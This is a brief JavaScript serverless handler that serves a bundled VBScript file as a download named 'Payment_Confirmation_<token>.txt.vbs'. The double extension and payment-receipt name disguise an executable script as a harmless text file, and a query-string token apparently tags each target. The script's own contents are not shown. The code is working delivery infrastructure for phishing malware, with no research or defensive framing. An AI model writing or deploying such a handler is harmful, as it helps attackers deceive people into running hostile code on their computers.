const fs = require("fs");
const path = require("path");

exports.handler = async function (event, context) {
  const token = event.queryStringParameters.token || "default";

  const filePath = path.join(__dirname, "assets", "yourscript.vbs");

  try {
    const fileContent = fs.readFileSync(filePath);

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename=Payment_Confirmation_${token}.txt.vbs`,
      },
      body: fileContent.toString("base64"),
      isBase64Encoded: true,
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: `Error reading file: ${error.message}`,
    };
  }
};
